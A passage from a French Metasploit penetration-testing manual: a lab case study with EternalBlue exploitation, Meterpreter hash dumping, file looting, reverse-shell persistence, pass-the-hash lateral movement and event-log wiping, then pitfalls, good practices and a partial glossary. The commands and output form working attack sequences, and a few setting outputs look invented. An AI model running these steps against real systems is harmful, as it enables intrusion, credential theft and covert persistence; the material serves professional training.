[+] 192.168.10.102:445 - The target is vulnerable.

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.10.50:4444
[*] 192.168.10.102:445 - Connecting to target for exploitation.
[+] 192.168.10.102:445 - Connection established for exploitation.
[+] 192.168.10.102:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.10.102:445 - CORE raw buffer dump (42 bytes)
...
[+] 192.168.10.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.10.102:445 - Sending egg to corrupted connection.
[*] 192.168.10.102:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.10.102
[*] Meterpreter session 2 opened (192.168.10.50:4444 -> 192.168.10.102:49155) at 2025-05-27 16:20:10 +0000

msf6 > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell unix/linux         uid=0, gid=0                  192.168.10.50:43215 -> 192.168.10.101:6200 (192.168.10.101)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SERV 192.168.10.50:4444 -> 192.168.10.102:49155 (192.168.10.102)
```

## Étape 6 : Post-exploitation (sur 192.168.10.102)

### Interaction avec la session Meterpreter

```
msf6 > sessions -i 2
meterpreter > sysinfo
Computer        : WIN-SERV
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Collecte d'informations (Pillage)

```
# Extraction des hachages
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hklm key...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...

# Recherche de fichiers sensibles
meterpreter > search -f *.docx -d C:\\Users
[*] Searching for *.docx in C:\Users
[+] Found 5 file(s)...
    C:\Users\Administrator\Documents\secret_plan.docx (15360 bytes)
    C:\Users\Public\Documents\template.docx (12288 bytes)
    ...

meterpreter > download C:\\Users\Administrator\Documents\secret_plan.docx /home/kali/pentest/acme_corp/loot/files/
[*] Downloading: C:\Users\Administrator\Documents\secret_plan.docx -> /home/kali/pentest/acme_corp/loot/files/secret_plan.docx
[*] Downloaded 15.00 KiB of 15.00 KiB (100.0%)

# Capture d'écran
meterpreter > screenshot
Screenshot saved to /home/kali/pentest/acme_corp/screenshots/screenshot_20250527_162530.jpeg
```

### Persistance

```
meterpreter > run persistence -X -i 60 -p 4445 -r 192.168.10.50
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/kali/.msf4/logs/persistence/WIN-SERV_20250527.1628.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.10.50 LPORT=4445
[*] Persistent agent script is 1191 bytes long
[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\abcdefgh.vbs
[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\abcdefgh.vbs
[+] Agent executed with PID 3124
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ijklmnop
[+] Persistent autorun script installed
```

### Mouvement latéral (vers 192.168.10.105)

```
# Configuration du routage
meterpreter > run autoroute -s 192.168.10.0/24
[*] Adding subnet 192.168.10.0/255.255.255.0 to routing table.

meterpreter > background

# Utilisation de psexec avec les hachages récupérés
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.10.105
RHOSTS => 192.168.10.105
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > exploit

[*] Started bind TCP handler against 192.168.10.105:4444
[*] 192.168.10.105:445 - Connecting to the server...
[*] 192.168.10.105:445 - Authenticating to 192.168.10.105:445 as user 'Administrator'...
[+] 192.168.10.105:445 - Authenticated as user 'Administrator'...
[*] 192.168.10.105:445 - Selecting appropriate target...
[*] 192.168.10.105:445 - Uploading payload... (73802 bytes)
[*] 192.168.10.105:445 - Created \WINDOWS\Temp\abcdefgh.exe...
[+] 192.168.10.105:445 - Service started successfully...
[*] 192.168.10.105:445 - Deleting \WINDOWS\Temp\abcdefgh.exe...
[*] Sending stage (179779 bytes) to 192.168.10.105
[*] Meterpreter session 3 opened (192.168.10.50:4444 -> 192.168.10.105:49152) at 2025-05-27 16:35:00 +0000

msf6 > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell unix/linux         uid=0, gid=0                  192.168.10.50:43215 -> 192.168.10.101:6200 (192.168.10.101)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SERV 192.168.10.50:4444 -> 192.168.10.102:49155 (192.168.10.102)
  3         meterpreter x86/windows  WIN7-PC\Administrator @ WIN7-PC 192.168.10.50:4444 -> 192.168.10.105:49152 (192.168.10.105)
```

## Étape 7 : Nettoyage et reporting

### Nettoyage

```
# Nettoyage de la persistance sur 192.168.10.102
msf6 > sessions -i 2
meterpreter > run multi_console_command -r /home/kali/.msf4/logs/persistence/WIN-SERV_20250527.1628.rc

# Suppression des fichiers uploadés
meterpreter > rm C:\Users\ADMINI~1\AppData\Local\Temp\abcdefgh.vbs

# Nettoyage des logs (à utiliser avec précaution)
meterpreter > clearev
[*] Wiping 3 records from Application...
[*] Wiping 3 records from System...
[*] Wiping 3 records from Security...

meterpreter > background

# Nettoyage sur 192.168.10.105
msf6 > sessions -i 3
meterpreter > rm C:\WINDOWS\Temp\abcdefgh.exe
meterpreter > background
```

### Génération du rapport

```
# Exportation des données du workspace
msf6 > db_export -f xml /home/kali/pentest/acme_corp/reports/acme_corp_data.xml
[*] XML file saved to /home/kali/pentest/acme_corp/reports/acme_corp_data.xml

# Utilisation d'un outil de reporting (ex: MSF-PDF ou Dradis)
# (Commandes spécifiques à l'outil choisi)
```

> **COMMENT ?**  
> Le nettoyage est une étape cruciale. Utilisez les scripts de nettoyage générés par les modules de persistance et supprimez manuellement les fichiers créés. Documentez toutes les actions de nettoyage dans votre rapport.

## Conclusion de l'étude de cas

Cette étude de cas a démontré comment appliquer la méthodologie de pentest avec Metasploit sur un réseau interne fictif. Nous avons réussi à :
- Identifier les systèmes actifs et les services vulnérables.
- Exploiter plusieurs vulnérabilités (vsFTPd backdoor, MS17-010).
- Obtenir un accès administrateur (SYSTEM) sur le serveur Windows.
- Récupérer des informations sensibles (hachages, fichiers).
- Mettre en place un mécanisme de persistance.
- Effectuer un mouvement latéral vers un autre poste Windows.

Ce scénario illustre la puissance de Metasploit lorsqu'il est combiné avec une méthodologie rigoureuse. Chaque étape, de la reconnaissance au reporting, est essentielle pour mener à bien un test d'intrusion efficace et professionnel.

Dans les sections suivantes, nous aborderons les pièges fréquents à éviter et les bonnes pratiques à adopter, ainsi qu'un glossaire des termes clés.
# Pièges fréquents & bonnes pratiques

## Introduction aux défis du pentest avec Metasploit

Malgré sa puissance et sa flexibilité, l'utilisation de Metasploit dans un contexte professionnel comporte de nombreux pièges qui peuvent compromettre l'efficacité, la fiabilité ou même la légalité d'un test d'intrusion. Cette section présente les erreurs les plus courantes et les bonnes pratiques pour les éviter.

### Pourquoi cette section est essentielle

> **POURQUOI ?**  
> Les erreurs commises lors d'un test d'intrusion peuvent avoir des conséquences graves : systèmes indisponibles, faux positifs/négatifs, problèmes légaux, ou simplement perte de crédibilité professionnelle. Connaître les pièges courants vous permettra d'éviter ces écueils et d'améliorer significativement la qualité de vos tests.

## Pièges liés à la préparation et à la configuration

### Absence de cadre légal clair

**Piège :** Commencer un test d'intrusion sans autorisation écrite explicite.

**Conséquences :**
- Poursuites judiciaires potentielles
- Confusion sur le périmètre autorisé
- Impossibilité de justifier certaines actions

**Bonnes pratiques :**
- Exiger systématiquement une autorisation écrite détaillant le périmètre, les dates et les contacts d'urgence
- Conserver cette autorisation accessible pendant toute la durée du test
- Vérifier que l'autorisation provient d'une personne habilitée à la donner

```
# Exemple de vérification de périmètre avant scan
msf6 > setg ALLOWED_RANGES 192.168.10.0/24,10.0.0.0/24
msf6 > setg RESTRICTED_RANGES 192.168.10.200-192.168.10.210
```

### Configuration incorrecte de l'environnement

**Piège :** Négliger la configuration initiale de Metasploit (base de données, workspaces, journalisation).

**Conséquences :**
- Perte de données ou mélange d'informations entre clients
- Impossibilité de produire des rapports cohérents
- Difficulté à reproduire les résultats

**Bonnes pratiques :**
- Vérifier systématiquement la connexion à la base de données avant de commencer
- Créer un workspace dédié pour chaque projet
- Configurer la journalisation dès le début de la session

```
# Vérifications essentielles avant de commencer
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# Si non connecté
msf6 > exit
$ sudo msfdb init
$ msfconsole

# Configuration initiale
msf6 > workspace -a client_xyz_mai2025
msf6 > spool /home/kali/pentest/logs/msf_session_$(date +%Y%m%d_%H%M%S).log
```

> **COMMENT ?**  
> Créez un script de vérification pré-pentest qui automatise ces contrôles. Exécutez-le systématiquement avant chaque nouvelle mission pour garantir que votre environnement est correctement configuré.

## Pièges liés à la reconnaissance

### Scans trop agressifs

**Piège :** Lancer des scans intensifs sans considération pour l'impact sur les systèmes cibles.

**Conséquences :**
- Déclenchement d'alertes de sécurité
- Perturbation des services (déni de service involontaire)
- Détection prématurée du test d'intrusion

**Bonnes pratiques :**
- Adapter l'intensité des scans à la robustesse des cibles
- Privilégier des scans progressifs (d'abord légers, puis plus approfondis)
- Coordonner les scans intensifs avec les équipes techniques du client

```
# Scan progressif plutôt qu'agressif
msf6 > db_nmap -sn 192.168.10.0/24                    # Découverte d'hôtes
msf6 > db_nmap -sS -F 192.168.10.1,192.168.10.100     # Scan rapide des ports courants
msf6 > db_nmap -sS -sV -p- 192.168.10.100             # Scan complet d'une cible prioritaire
```

### Confiance excessive dans les outils automatisés

**Piège :** Se fier uniquement aux résultats des scanners automatiques.

**Conséquences :**
- Faux négatifs (vulnérabilités manquées)
- Faux positifs (vulnérabilités inexistantes)
- Compréhension superficielle de l'environnement cible

**Bonnes pratiques :**
- Croiser les résultats de plusieurs outils
- Vérifier manuellement les vulnérabilités critiques
- Comprendre le fonctionnement des services avant de les exploiter

```
# Vérification manuelle après détection automatique
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.10.100
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# Vérification manuelle avec Nmap
msf6 > db_nmap --script smb-vuln-ms17-010 -p 445 192.168.10.100

# Vérification avec un module d'exploitation en mode check
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.10.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
```

## Pièges liés à l'exploitation

### Utilisation d'exploits instables

**Piège :** Utiliser des exploits de faible rang sans évaluer les risques.

**Conséquences :**
- Crash des services ou des systèmes
- Déni de service involontaire
- Perte de crédibilité auprès du client

**Bonnes pratiques :**
- Privilégier les exploits avec un rang élevé (Excellent, Great, Good)
- Utiliser la fonction `check` lorsqu'elle est disponible
- Tester les exploits dans un environnement similaire avant utilisation en production

```
# Vérification du rang d'un exploit
msf6 > grep rank exploit/windows/smb/ms17_010_eternalblue
  Rank: excellent

# Utilisation de la fonction check
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[+] 192.168.10.100:445 - The target is vulnerable.
```

| Rang | Fiabilité | Recommandation |
|------|-----------|----------------|
| Excellent | Très fiable, ne plante jamais la cible | Utilisation prioritaire |
| Great | Fiable dans la plupart des cas | Utilisation recommandée |
| Good | Généralement fiable | Utilisation possible après vérification |
| Normal | Fiabilité moyenne | Utilisation avec précaution |
| Average | Fiabilité variable | Test préalable nécessaire |
| Low | Peu fiable | Éviter si possible |
| Manual | Nécessite une intervention manuelle | Pour utilisateurs expérimentés uniquement |

### Configuration incorrecte des payloads

**Piège :** Négliger la configuration des payloads ou utiliser des paramètres par défaut inappropriés.

**Conséquences :**
- Échec de l'exploitation malgré une vulnérabilité réelle
- Sessions instables ou rapidement perdues
- Détection par les solutions de sécurité

**Bonnes pratiques :**
- Adapter le payload au contexte (architecture, système d'exploitation, restrictions réseau)
- Configurer correctement les options LHOST et LPORT
- Utiliser des techniques d'évasion lorsque nécessaire

```
# Configuration adaptée au contexte
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 443
msf6 exploit(windows/smb/ms17_010_eternalblue) > set EnableStageEncoding true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set StageEncoder x64/xor
msf6 exploit(windows/smb/ms17_010_eternalblue) > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> **POURQUOI ?**  
> Les solutions de sécurité modernes détectent facilement les payloads par défaut. Une configuration personnalisée (ports standards, encodage, user-agent réaliste) augmente significativement vos chances de succès et de discrétion.

### Exploitation sans sauvegarde

**Piège :** Exploiter des vulnérabilités sans plan de restauration.

**Conséquences :**
- Impossibilité de restaurer les systèmes en cas de problème
- Interruption prolongée des services
- Responsabilité légale potentielle

**Bonnes pratiques :**
- Documenter l'état initial des systèmes avant exploitation
- Prévoir des procédures de restauration pour chaque exploitation
- Coordonner les tests critiques avec les équipes techniques du client

```
# Documentation de l'état initial
meterpreter > sysinfo > /home/kali/pentest/logs/pre_exploit_sysinfo.txt
meterpreter > getuid > /home/kali/pentest/logs/pre_exploit_user.txt
meterpreter > ps > /home/kali/pentest/logs/pre_exploit_processes.txt

# Création d'un point de restauration (Windows)
meterpreter > shell
C:\> wmic.exe /Namespace:\\root\default Path SystemRestore Call CreateRestorePoint "Pre-Pentest Snapshot", 100, 7
```

## Pièges liés à la post-exploitation

### Élévation de privilèges excessive

**Piège :** Obtenir et maintenir des privilèges SYSTEM/root sur tous les systèmes sans nécessité.

**Conséquences :**
- Risque accru d'impact négatif sur les systèmes
- Visibilité excessive dans les journaux de sécurité
- Déclenchement d'alertes de sécurité

**Bonnes pratiques :**
- N'élever les privilèges que lorsque nécessaire pour atteindre les objectifs du test
- Revenir à des privilèges moindres après les opérations critiques
- Documenter précisément les actions effectuées avec privilèges élevés

```
# Élévation temporaire de privilèges
meterpreter > getsystem
[+] Got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

# Exécution des actions nécessitant des privilèges élevés
meterpreter > hashdump

# Retour à des privilèges moindres
meterpreter > rev2self
```

### Persistance inappropriée

**Piège :** Mettre en place des mécanismes de persistance intrusifs ou mal documentés.

**Conséquences :**
- Vulnérabilités résiduelles après le test
- Détection par les équipes de sécurité du client
- Exploitation potentielle par de véritables attaquants

**Bonnes pratiques :**
- Limiter la persistance aux cas strictement nécessaires
- Privilégier des méthodes facilement réversibles
- Documenter exhaustivement tous les mécanismes mis en place
- Nettoyer systématiquement en fin de test

```
# Persistance documentée et limitée dans le temps
meterpreter > run persistence -X -i 60 -p 443 -r 192.168.10.50 -A 24h
[*] Creating a persistent agent: LHOST=192.168.10.50 LPORT=443 (interval=60 onboot=true)
[*] Resource file for cleanup created at /home/kali/.msf4/logs/persistence/WIN-SERV_20250527.1628.rc

# Documentation dans le journal de test
echo "Persistance mise en place sur 192.168.10.100 le $(date), fichier de nettoyage: /home/kali/.msf4/logs/persistence/WIN-SERV_20250527.1628.rc" >> /home/kali/pentest/logs/persistence_log.txt
```

### Extraction excessive de données

**Piège :** Extraire des données sensibles sans nécessité pour le test.

**Conséquences :**
- Violation potentielle des réglementations (RGPD, etc.)
- Responsabilité légale accrue
- Perte de confiance du client

**Bonnes pratiques :**
- Limiter l'extraction aux preuves nécessaires pour démontrer l'impact
- Anonymiser les données sensibles lorsque possible
- Chiffrer systématiquement les données extraites
- Définir une politique claire de conservation et de destruction

```
# Extraction limitée et ciblée
meterpreter > search -f *.config -d C:\\inetpub\\wwwroot
meterpreter > download C:\\inetpub\\wwwroot\\web.config /home/kali/pentest/loot/configs/

# Chiffrement immédiat des données sensibles
$ gpg -e -r votre@email.com /home/kali/pentest/loot/configs/web.config
$ shred -u /home/kali/pentest/loot/configs/web.config
```

> **COMMENT ?**  
> Créez une checklist de nettoyage pour chaque système compromis. Cette liste doit inclure tous les fichiers créés, les modifications apportées et les mécanismes de persistance mis en place. Utilisez cette liste en fin de test pour garantir un nettoyage complet.

## Pièges liés au reporting

### Documentation insuffisante

**Piège :** Négliger la documentation en temps réel des actions effectuées.

**Conséquences :**
- Impossibilité de reproduire certains résultats
- Difficulté à justifier certaines conclusions
- Rapports incomplets ou imprécis

**Bonnes pratiques :**
- Activer la journalisation dès le début de chaque session
- Documenter systématiquement les commandes importantes et leurs résultats
- Capturer des preuves (screenshots, output de commandes) à chaque étape clé

```
# Documentation en temps réel
msf6 > spool /home/kali/pentest/logs/session_$(date +%Y%m%d_%H%M%S).log

# Capture de preuves
meterpreter > screenshot -v true
meterpreter > run post/windows/gather/hashdump
meterpreter > record_mic -d 10 -f /home/kali/pentest/evidence/audio_proof.wav
```

### Rapports trop techniques

**Piège :** Produire des rapports excessivement techniques sans adaptation au public cible.

**Conséquences :**
- Incompréhension des enjeux par la direction
- Difficulté pour les équipes techniques à prioriser les corrections
- Sous-estimation de l'impact réel des vulnérabilités

**Bonnes pratiques :**
- Adapter le niveau technique à l'audience (rapport exécutif vs. rapport technique)
- Illustrer l'impact business des vulnérabilités
- Fournir des recommandations claires et priorisées
- Inclure des preuves visuelles pour les vulnérabilités critiques

```
# Structure recommandée pour les rapports
1. Résumé exécutif (non technique)
   - Niveau de risque global
   - Principales vulnérabilités et leur impact business
   - Recommandations prioritaires

2. Méthodologie (semi-technique)
   - Approche utilisée
   - Outils employés
   - Limitations du test

3. Résultats détaillés (technique)
   - Description précise des vulnérabilités
   - Étapes de reproduction
   - Preuves techniques (screenshots, logs)
   - Recommandations spécifiques
```

### Minimisation ou exagération des risques

**Piège :** Présenter les vulnérabilités avec un niveau de risque inapproprié.

**Conséquences :**
- Allocation incorrecte des ressources de correction
- Perte de crédibilité auprès du client
- Fausse impression de sécurité ou panique injustifiée

**Bonnes pratiques :**
- Utiliser une méthodologie standardisée pour l'évaluation des risques (CVSS)
- Contextualiser le risque en fonction de l'environnement spécifique du client
- Distinguer clairement la gravité technique de l'impact business

```
# Évaluation standardisée avec CVSS
Vulnérabilité: MS17-010 (EternalBlue)
Score CVSS: 9.8 (Critique)
Vecteur CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Impact technique: Exécution de code à distance avec privilèges SYSTEM
Impact business: Compromission potentielle de toutes les données clients, interruption des services critiques
```

## Pièges liés à l'éthique et à la légalité

### Dépassement du périmètre autorisé

**Piège :** Étendre le test au-delà du périmètre explicitement autorisé.

**Conséquences :**
- Violations légales potentielles
- Perturbation de services non inclus dans le test
- Rupture de la relation de confiance avec le client

**Bonnes pratiques :**
- Documenter précisément le périmètre autorisé avant de commencer
- Mettre en place des contrôles techniques pour éviter les débordements
- Demander une autorisation explicite avant toute extension du périmètre

```
# Configuration de restrictions de périmètre
msf6 > setg ALLOWED_RANGES 192.168.10.0/24,10.0.0.0/24
msf6 > setg RESTRICTED_RANGES 192.168.10.200-192.168.10.210

# Vérification avant scan
msf6 > use auxiliary/scanner/ip/ipidseq
msf6 auxiliary(scanner/ip/ipidseq) > set RHOSTS 192.168.11.0/24
msf6 auxiliary(scanner/ip/ipidseq) > run
[-] Warning: 192.168.11.0/24 is not in the allowed range, correcting to 192.168.10.0/24
```

### Non-respect des heures convenues

**Piège :** Réaliser des tests en dehors des plages horaires autorisées.

**Conséquences :**
- Perturbation des activités critiques du client
- Déclenchement de procédures d'urgence injustifiées
- Confusion avec de véritables attaques

**Bonnes pratiques :**
- Documenter précisément les plages horaires autorisées
- Configurer des rappels ou des contrôles automatiques
- Communiquer proactivement avec le client en cas de besoin d'extension

```
# Script de vérification des horaires autorisés
cat > check_testing_hours.sh << EOF
#!/bin/bash
ALLOWED_START=22:00
ALLOWED_END=06:00
CURRENT_TIME=\$(date +%H:%M)

if [[ "\$CURRENT_TIME" > "\$ALLOWED_START" || "\$CURRENT_TIME" < "\$ALLOWED_END" ]]; then
  echo "Testing authorized: within allowed hours (\$ALLOWED_START-\$ALLOWED_END)"
  exit 0
else
  echo "WARNING: Testing NOT authorized at this time (\$CURRENT_TIME)"
  echo "Allowed hours: \$ALLOWED_START-\$ALLOWED_END"
  exit 1
fi
EOF

chmod +x check_testing_hours.sh
./check_testing_hours.sh || exit
```

> **POURQUOI ?**  
> Le respect strict du périmètre et des horaires convenus est non seulement une question d'éthique professionnelle, mais aussi une protection juridique essentielle. Un test d'intrusion non autorisé, même partiellement, peut être qualifié d'acte malveillant au sens de la loi.

## Bonnes pratiques générales

### Approche méthodique et progressive

**Principe :** Adopter une approche structurée et progressive, du moins intrusif au plus intrusif.

**Avantages :**
- Minimisation des risques d'impact négatif
- Meilleure compréhension de l'environnement
- Documentation plus complète et cohérente

**Mise en œuvre :**
1. Commencer par des techniques passives et non intrusives
2. Progresser vers des scans légers puis plus approfondis
3. Exploiter d'abord les vulnérabilités les plus fiables
4. Documenter chaque étape avant de passer à la suivante

```
# Exemple d'approche progressive
# 1. Reconnaissance passive
msf6 > use auxiliary/gather/dns_enum

# 2. Scan léger
msf6 > db_nmap -sn 192.168.10.0/24

# 3. Scan ciblé
msf6 > db_nmap -sS -sV -p 80,443,445 192.168.10.100

# 4. Vérification de vulnérabilités
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# 5. Exploitation avec vérification préalable
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Communication proactive

**Principe :** Maintenir une communication claire et régulière avec le client tout au long du test.

**Avantages :**
- Évitement des malentendus et des surprises
- Possibilité d'ajuster le test en fonction des retours
- Renforcement de la relation de confiance

**Mise en œuvre :**
- Organiser une réunion de cadrage avant le début du test
- Fournir des points d'avancement réguliers
- Signaler immédiatement les vulnérabilités critiques
- Organiser une réunion de débriefing après le test

```
# Modèle de rapport d'avancement quotidien
Date: 27/05/2025
Statut: En cours
Progression: 60%

Actions réalisées aujourd'hui:
- Scan complet du réseau 192.168.10.0/24
- Identification de 3 vulnérabilités critiques (détails en annexe)
- Exploitation réussie du serveur Windows 2008 R2

Difficultés rencontrées:
- Accès limité au segment réseau 10.0.0.0/24 (firewall)

Actions prévues demain:
- Test des applications web identifiées
- Tentatives de mouvement latéral
- Début de la rédaction du rapport préliminaire

Questions/besoins:
- Autorisation d'étendre le test au serveur de backup (10.0.0.15)
```

### Formation continue

**Principe :** Maintenir et développer constamment ses compétences techniques et méthodologiques.

**Avantages :**
- Connaissance des dernières vulnérabilités et techniques
- Amélioration continue de la qualité des tests
- Crédibilité accrue auprès des clients

**Mise en œuvre :**
- Suivre les actualités de sécurité (CVE, exploits, techniques)
- Participer à des CTF et des challenges de sécurité
- Contribuer à des projets open source liés à la sécurité
- Partager ses connaissances (blog, conférences, formations)

```
# Sources d'information recommandées
- Rapid7 Blog: https://blog.rapid7.com/
- ExploitDB: https://www.exploit-db.com/
- CVE Details: https://www.cvedetails.com/
- GitHub Security Lab: https://securitylab.github.com/

# Environnements d'entraînement
- Vulnhub: https://www.vulnhub.com/
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
```

> **COMMENT ?**  
> Consacrez au moins 20% de votre temps professionnel à la veille technologique et à l'amélioration de vos compétences. La sécurité informatique évolue rapidement, et rester à jour est essentiel pour maintenir l'efficacité de vos tests d'intrusion.

## Checklist de vérification pré-pentest

Utilisez cette checklist avant chaque test pour éviter les pièges les plus courants :

1. **Cadre légal**
   - [ ] Autorisation écrite obtenue et vérifiée
   - [ ] Périmètre clairement défini
   - [ ] Plages horaires convenues
   - [ ] Contacts d'urgence identifiés

2. **Environnement technique**
   - [ ] Base de données PostgreSQL fonctionnelle
   - [ ] Workspace dédié créé
   - [ ] Journalisation activée
   - [ ] Outils à jour (msfupdate, searchsploit -u)

3. **Méthodologie**
   - [ ] Plan de test documenté
   - [ ] Approche progressive définie
   - [ ] Critères de risque établis
   - [ ] Procédures de nettoyage préparées

4. **Communication**
   - [ ] Réunion de cadrage réalisée
   - [ ] Processus d'escalade défini
   - [ ] Format et fréquence des rapports d'avancement convenus
   - [ ] Attentes du client clarifiées

## En résumé

La maîtrise technique de Metasploit est nécessaire mais insuffisante pour réaliser des tests d'intrusion professionnels. Une approche méthodique, éthique et rigoureuse est tout aussi importante que les compétences techniques.

Points clés à retenir :
- Préparez minutieusement chaque test (cadre légal, environnement, méthodologie)
- Adoptez une approche progressive et documentez chaque étape
- Privilégiez la qualité et la précision plutôt que la quantité de vulnérabilités
- Communiquez proactivement avec le client tout au long du test
- Nettoyez rigoureusement après chaque test
- Produisez des rapports adaptés à l'audience et contextualisés
- Investissez dans votre formation continue

En évitant ces pièges courants et en suivant ces bonnes pratiques, vous transformerez vos compétences techniques en une véritable expertise professionnelle, valorisée et respectée par vos clients.
# Glossaire final

## Introduction au glossaire

Ce glossaire regroupe les termes techniques, acronymes et concepts clés utilisés dans ce manuel. Il a été conçu pour servir de référence rapide et faciliter la compréhension des notions spécifiques au domaine du pentest et à l'utilisation du Metasploit Framework.

## Termes et définitions

### A

**Active Directory (AD)**  
Système de gestion d'identités et d'accès développé par Microsoft, permettant l'authentification centralisée et la gestion des ressources dans un réseau Windows.

**Agent**  
Programme qui s'exécute sur un système cible et communique avec un serveur de contrôle. Dans Metasploit, les payloads comme Meterpreter sont des agents.

**Armitage**  
Interface graphique pour Metasploit qui visualise les cibles et recommande des exploits.

**Authentification**  
Processus de vérification de l'identité d'un utilisateur, d'un système ou d'une application.

**Autorisation**  
Processus qui détermine les droits et privilèges accordés à une identité authentifiée.

**Auxiliaire (module)**  
Type de module dans Metasploit qui fournit des fonctionnalités supplémentaires comme le scanning, le fuzzing ou le brute forcing, sans nécessairement exploiter une vulnérabilité.

### B

**Backdoor**  
Méthode secrète d'accès à un système, contournant les mécanismes d'authentification normaux.

**Base de données**  
Dans le contexte de Metasploit, fait référence à PostgreSQL qui stocke les informations sur les hôtes, services, vulnérabilités et sessions.

**Bind shell**  
Type de payload qui ouvre un port d'écoute sur la machine cible, permettant à l'attaquant de s'y connecter.

**BloodHound**  
Outil qui utilise la théorie des graphes pour révéler les relations cachées et les chemins d'attaque dans un environnement Active Directory.

**Brute force**  
Technique d'attaque qui consiste à essayer systématiquement toutes les combinaisons possibles pour trouver un mot de passe ou une clé.

### C

**C2 (Command and Control)**  
Infrastructure utilisée par les attaquants pour communiquer avec les systèmes compromis.

**Callback**  
Connexion initiée depuis la machine cible vers l'attaquant, généralement utilisée par les reverse shells.

**CrackMapExec (CME)**  
Outil post-exploitation qui aide à identifier et exploiter les faiblesses dans les environnements Windows/Active Directory.

**Credential Harvesting**  
Processus de collecte d'identifiants (noms d'utilisateur, mots de passe, hachages) sur un système compromis.

**CVE (Common Vulnerabilities and Exposures)**  
Système de référencement standardisé des vulnérabilités de sécurité informatique.

**CVSS (Common Vulnerability Scoring System)**  
Système standardisé pour évaluer la gravité des vulnérabilités informatiques.

### D

**db_export**  
Commande Metasploit qui exporte les données de la base de données dans différents formats (XML, HTML, etc.).

**db_import**  
Commande Metasploit qui importe des données de scan (comme les résultats de Nmap) dans la base de données.

**db_nmap**  
Version de Nmap intégrée à Metasploit qui stocke automatiquement les résultats dans la base de données.

**DLL Injection**  
Technique qui consiste à forcer un processus à charger une bibliothèque dynamique malveillante.

**Domain Controller (DC)**  
Serveur qui répond aux demandes d'authentification et vérifie les droits d'accès dans un domaine Windows.

### E

**Élévation de privilèges**  
Processus d'obtention de privilèges supérieurs à ceux initialement accordés.

**Encodeur**  
Module Metasploit qui modifie la signature d'un payload pour éviter la détection par les solutions de sécurité.

**Enum4linux**  
Outil d'énumération des informations sur les systèmes Windows et Samba.

**Exploit**  
Code qui tire parti d'une vulnérabilité pour compromettre un système ou une application.

**Exploit-DB**  
Base de données publique d'exploits et de vulnérabilités maintenue par Offensive Security.

**EternalBlue**  
Exploit ciblant une vulnérabilité SMB (MS17-010) rendu célèbre par le ransomware WannaCry.

### F

**Firewall**  
Dispositif de sécurité réseau qui filtre le trafic entrant et sortant selon des règles prédéfinies.

**Framework**  
Ensemble d'outils, de bibliothèques et de conventions qui fournissent une structure pour développer des applications.

**FTP (File Transfer Protocol)**  
Protocole réseau utilisé pour le transfert de fichiers entre un client et un serveur.

**Fuzzing**  
Technique de test qui consiste à injecter des données aléatoires ou malformées dans une application pour provoquer des comportements inattendus.

### H

**Handler**  
Module Metasploit qui gère les connexions entrantes des payloads.

**Hashdump**  
Processus d'extraction des hachages de mots de passe d'un système.

**Hachage (Hash)**  
Résultat d'une fonction de hachage qui convertit des données de taille variable en une chaîne de caractères de taille fixe.

**Hôte (Host)**  
Tout dispositif connecté à un réseau, comme un ordinateur, un serveur ou un équipement réseau.

### I

